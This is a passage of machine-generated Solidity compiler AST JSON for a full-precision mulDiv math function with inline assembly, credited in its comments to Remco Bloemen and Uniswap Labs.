0"},"value":"0"},"src":"2516:10:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1840,"nodeType":"IfStatement","src":"2512:75:10","trueBody":{"id":1839,"nodeType":"Block","src":"2528:59:10","statements":[{"expression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1837,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1835,"name":"prod0","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1826,"src":"2553:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"/","rightExpression":{"id":1836,"name":"denominator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1820,"src":"2561:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"2553:19:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":1824,"id":1838,"nodeType":"Return","src":"2546:26:10"}]}},{"expression":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1844,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1842,"name":"denominator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1820,"src":"2697:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"id":1843,"name":"prod1","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1829,"src":"2711:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"2697:19:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"}],"id":1841,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"2689:7:10","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$returns$__$","typeString":"function (bool) pure"}},"id":1845,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"2689:28:10","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1846,"nodeType":"ExpressionStatement","src":"2689:28:10"},{"assignments":[1848],"declarations":[{"constant":false,"id":1848,"mutability":"mutable","name":"remainder","nameLocation":"2981:9:10","nodeType":"VariableDeclaration","scope":1933,"src":"2973:17:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1847,"name":"uint256","nodeType":"ElementaryTypeName","src":"2973:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":1849,"nodeType":"VariableDeclarationStatement","src":"2973:17:10"},{"AST":{"nodeType":"YulBlock","src":"3013:291:10","statements":[{"nodeType":"YulAssignment","src":"3082:38:10","value":{"arguments":[{"name":"x","nodeType":"YulIdentifier","src":"3102:1:10"},{"name":"y","nodeType":"YulIdentifier","src":"3105:1:10"},{"name":"denominator","nodeType":"YulIdentifier","src":"3108:11:10"}],"functionName":{"name":"mulmod","nodeType":"YulIdentifier","src":"3095:6:10"},"nodeType":"YulFunctionCall","src":"3095:25:10"},"variableNames":[{"name":"remainder","nodeType":"YulIdentifier","src":"3082:9:10"}]},{"nodeType":"YulAssignment","src":"3202:41:10","value":{"arguments":[{"name":"prod1","nodeType":"YulIdentifier","src":"3215:5:10"},{"arguments":[{"name":"remainder","nodeType":"YulIdentifier","src":"3225:9:10"},{"name":"prod0","nodeType":"YulIdentifier","src":"3236:5:10"}],"functionName":{"name":"gt","nodeType":"YulIdentifier","src":"3222:2:10"},"nodeType":"YulFunctionCall","src":"3222:20:10"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"3211:3:10"},"nodeType":"YulFunctionCall","src":"3211:32:10"},"variableNames":[{"name":"prod1","nodeType":"YulIdentifier","src":"3202:5:10"}]},{"nodeType":"YulAssignment","src":"3260:30:10","value":{"arguments":[{"name":"prod0","nodeType":"YulIdentifier","src":"3273:5:10"},{"name":"remainder","nodeType":"YulIdentifier","src":"3280:9:10"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"3269:3:10"},"nodeType":"YulFunctionCall","src":"3269:21:10"},"variableNames":[{"name":"prod0","nodeType":"YulIdentifier","src":"3260:5:10"}]}]},"evmVersion":"london","externalReferences":[{"declaration":1820,"isOffset":false,"isSlot":false,"src":"3108:11:10","valueSize":1},{"declaration":1826,"isOffset":false,"isSlot":false,"src":"3236:5:10","valueSize":1},{"declaration":1826,"isOffset":false,"isSlot":false,"src":"3260:5:10","valueSize":1},{"declaration":1826,"isOffset":false,"isSlot":false,"src":"3273:5:10","valueSize":1},{"declaration":1829,"isOffset":false,"isSlot":false,"src":"3202:5:10","valueSize":1},{"declaration":1829,"isOffset":false,"isSlot":false,"src":"3215:5:10","valueSize":1},{"declaration":1848,"isOffset":false,"isSlot":false,"src":"3082:9:10","valueSize":1},{"declaration":1848,"isOffset":false,"isSlot":false,"src":"3225:9:10","valueSize":1},{"declaration":1848,"isOffset":false,"isSlot":false,"src":"3280:9:10","valueSize":1},{"declaration":1816,"isOffset":false,"isSlot":false,"src":"3102:1:10","valueSize":1},{"declaration":1818,"isOffset":false,"isSlot":false,"src":"3105:1:10","valueSize":1}],"id":1850,"nodeType":"InlineAssembly","src":"3004:300:10"},{"assignments":[1852],"declarations":[{"constant":false,"id":1852,"mutability":"mutable","name":"twos","nameLocation":"3619:4:10","nodeType":"VariableDeclaration","scope":1933,"src":"3611:12:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1851,"name":"uint256","nodeType":"ElementaryTypeName","src":"3611:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":1860,"initialValue":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1859,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1853,"name":"denominator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1820,"src":"3626:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"&","rightExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1857,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1855,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"~","prefix":true,"src":"3641:12:10","subExpression":{"id":1854,"name":"denominator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1820,"src":"3642:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"hexValue":"31","id":1856,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"3656:1:10","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"3641:16:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":1858,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"3640:18:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"3626:32:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"3611:47:10"},{"AST":{"nodeType":"YulBlock","src":"3681:362:10","statements":[{"nodeType":"YulAssignment","src":"3746:37:10","value":{"arguments":[{"name":"denominator","nodeType":"YulIdentifier","src":"3765:11:10"},{"name":"twos","nodeType":"YulIdentifier","src":"3778:4:10"}],"functionName":{"name":"div","nodeType":"YulIdentifier","src":"3761:3:10"},"nodeType":"YulFunctionCall","src":"3761:22:10"},"variableNames":[{"name":"denominator","nodeType":"YulIdentifier","src":"3746:11:10"}]},{"nodeType":"YulAssignment","src":"3850:25:10","value":{"arguments":[{"name":"prod0","nodeType":"YulIdentifier","src":"3863:5:10"},{"name":"twos","nodeType":"YulIdentifier","src":"3870:4:10"}],"functionName":{"name":"div","nodeType":"YulIdentifier","src":"3859:3:10"},"nodeType":"YulFunctionCall","src":"3859:16:10"},"variableNames":[{"name":"prod0","nodeType":"YulIdentifier","src":"3850:5:10"}]},{"nodeType":"YulAssignment","src":"3990:39:10","value":{"arguments":[{"arguments":[{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"4010:1:10","type":"","value":"0"},{"name":"twos","nodeType":"YulIdentifier","src":"4013:4:10"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"4006:3:10"},"nodeType":"YulFunctionCall","src":"4006:12:10"},{"name":"twos","nodeType":"YulIdentifier","src":"4020:4:10"}],"functionName":{"name":"div","nodeType":"YulIdentifier","src":"4002:3:10"},"nodeType":"YulFunctionCall","src":"4002:23:10"},{"kind":"number","nodeType":"YulLiteral","src":"4027:1:10","type":"","value":"1"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"3998:3:10"},"nodeType":"YulFunctionCall","src":"3998:31:10"},"variableNames":[{"name":"twos","nodeType":"YulIdentifier","src":"3990:4:10"}]}]},"evmVersion":"london","externalReferences":[{"declaration":1820,"isOffset":false,"isSlot":false,"src":"3746:11:10","valueSize":1},{"declaration":1820,"isOffset":false,"isSlot":false,"src":"3765:11:10","valueSize":1},{"declaration":1826,"isOffset":false,"isSlot":false,"src":"3850:5:10","valueSize":1},{"declaration":1826,"isOffset":false,"isSlot":false,"src":"3863:5:10","valueSize":1},{"declaration":1852,"isOffset":false,"isSlot":false,"src":"3778:4:10","valueSize":1},{"declaration":1852,"isOffset":false,"isSlot":false,"src":"3870:4:10","valueSize":1},{"declaration":1852,"isOffset":false,"isSlot":false,"src":"3990:4:10","valueSize":1},{"declaration":1852,"isOffset":false,"isSlot":false,"src":"4013:4:10","valueSize":1},{"declaration":1852,"isOffset":false,"isSlot":false,"src":"4020:4:10","valueSize":1}],"id":1861,"nodeType":"InlineAssembly","src":"3672:371:10"},{"expression":{"id":1866,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1862,"name":"prod0","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1826,"src":"4109:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"|=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1865,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1863,"name":"prod1","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1829,"src":"4118:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"id":1864,"name":"twos","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1852,"src":"4126:4:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"4118:12:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"4109:21:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1867,"nodeType":"ExpressionStatement","src":"4109:21:10"},{"assignments":[1869],"declarations":[{"constant":false,"id":1869,"mutability":"mutable","name":"inverse","nameLocation":"4456:7:10","nodeType":"VariableDeclaration","scope":1933,"src":"4448:15:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1868,"name":"uint256","nodeType":"ElementaryTypeName","src":"4448:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":1876,"initialValue":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1875,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1872,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"33","id":1870,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"4467:1:10","typeDescriptions":{"typeIdentifier":"t_rational_3_by_1","typeString":"int_const 3"},"value":"3"},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"id":1871,"name":"denominator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1820,"src":"4471:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"4467:15:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":1873,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"4466:17:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"^","rightExpression":{"hexValue":"32","id":1874,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"4486:1:10","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"src":"4466:21:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"4448:39:10"},{"expression":{"id":1883,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1877,"name":"inverse","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1869,"src":"4704:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"*=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1882,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"32","id":1878,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"4715:1:10","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1881,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1879,"name":"denominator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1820,"src":"4719:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"id":1880,"name":"inverse","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1869,"src":"4733:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"4719:21:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"4715:25:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"4704:36:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1884,"nodeType":"ExpressionStatement","src":"4704:36:10"},{"expression":{"id":1891,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1885,"name":"inverse","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1869,"src":"4773:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"*=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1890,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"32","id":1886,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"4784:1:10","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1889,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1887,"name":"denominator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1820,"src":"4788:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"id":1888,"name":"inverse","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1869,"src":"4802:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"4788:21:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"4784:25:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"4773:36:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1892,"nodeType":"ExpressionStatement","src":"4773:36:10"},{"expression":{"id":1899,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1893,"name":"inverse","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1869,"src":"4843:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"*=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1898,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"32","id":1894,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"4854:1:10","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1897,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1895,"name":"denominator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1820,"src":"4858:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"id":1896,"name":"inverse","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1869,"src":"4872:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"4858:21:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"4854:25:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"4843:36:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1900,"nodeType":"ExpressionStatement","src":"4843:36:10"},{"expression":{"id":1907,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1901,"name":"inverse","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1869,"src":"4913:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"*=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1906,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"32","id":1902,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"4924:1:10","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1905,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1903,"name":"denominator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1820,"src":"4928:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"id":1904,"name":"inverse","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1869,"src":"4942:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"4928:21:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"4924:25:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"4913:36:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1908,"nodeType":"ExpressionStatement","src":"4913:36:10"},{"expression":{"id":1915,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1909,"name":"inverse","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1869,"src":"4983:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"*=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1914,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"32","id":1910,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"4994:1:10","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1913,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1911,"name":"denominator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1820,"src":"4998:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"id":1912,"name":"inverse","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1869,"src":"5012:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"4998:21:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"4994:25:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"4983:36:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1916,"nodeType":"ExpressionStatement","src":"4983:36:10"},{"expression":{"id":1923,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1917,"name":"inverse","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1869,"src":"5054:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"*=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1922,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"32","id":1918,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"5065:1:10","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1921,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1919,"name":"denominator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1820,"src":"5069:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"id":1920,"name":"inverse","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1869,"src":"5083:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"5069:21:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"5065:25:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"5054:36:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1924,"nodeType":"ExpressionStatement","src":"5054:36:10"},{"expression":{"id":1929,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1925,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1823,"src":"5524:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1928,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1926,"name":"prod0","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1826,"src":"5533:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"id":1927,"name":"inverse","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1869,"src":"5541:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"5533:15:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"5524:24:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1930,"nodeType":"ExpressionStatement","src":"5524:24:10"},{"expression":{"id":1931,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1823,"src":"5569:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":1824,"id":1932,"nodeType":"Return","src":"5562:13:10"}]}]},"documentation":{"id":1814,"nodeType":"StructuredDocumentation","src":"1357:305:10","text":" @notice Calculates floor(x * y / denominator) with full precision. Throws if result overflows a uint256 or denominator == 0\n @dev Original credit to Remco Bloemen under MIT license (https://xn--2-umb.com/21/muldiv)\n with further edits by Uniswap Labs also under MIT license."},"id":1935,"implemented":true,"kind":"function","modifiers":[],"name":"mulDiv","nameLocation":"1676:6:10","nodeType":"FunctionDefinition","parameters":{"id":1821,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1816,"mutability":"mutable","name":"x","nameLocation":"1700:1:10","nodeType":"VariableDeclaration","scope":1935,"src":"1692:9:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1815,"name":"uint256","nodeType":"ElementaryTypeName","src":"1692:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1818,"mutability":"mutable","name":"y","nameLocation":"1719:1:10","nodeType":"VariableDeclaration","scope":1935,"src":"1711:9:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1817,"name":"uint256","nodeType":"ElementaryTypeName","src":"1711:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1820,"mutability":"mutable","name":"denominator","nameLocation":"1738:11:10","nodeType":"VariableDeclaration","scope":1935,"src":"1730:19:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1819,"name":"uint256","nodeType":"ElementaryTypeName","src":"1730:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"1682:73:10"},"returnParameters":{"id":1824,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1823,"mutability":"mutable","name":"result","nameLocation":"1787:6:10","nodeType":"VariableDeclaration","scope":1935,"src":"1779:14:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1822,"name":"uint256","nodeType":"ElementaryTypeName","src":"1779:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"1778:16:10"},"scope":2587,"src":"1667:3925:10","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":1978,"nodeType":"Block","src":"5872:189:10","statements":[{"assignments":[1951],"declarations":[{"constant":false,"id":1951,"mutability":"mutable","name":"result","nameLocation":"5890:6:10","nodeType":"VariableDeclaration","scope":1978,"src":"5882:14:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1950,"name":"uint256","nodeType":"ElementaryTypeName","src":"5882:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":1957,"initialValue":{"arguments":[{"id":1953,"name":"x","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1938,"src":"5906:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":1954,"name":"y","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1940,"src":"5909:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":1955,"name":"denominator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1942,"src":"5912:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1952,"name":"mulDiv","nodeType":"Identifier","overloadedDeclarations":[1935,1979],"referencedDeclaration":1935,"src":"5899:6:10","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$_t_uint256_$_t_uint256_$returns$_t_uint256_$","typeS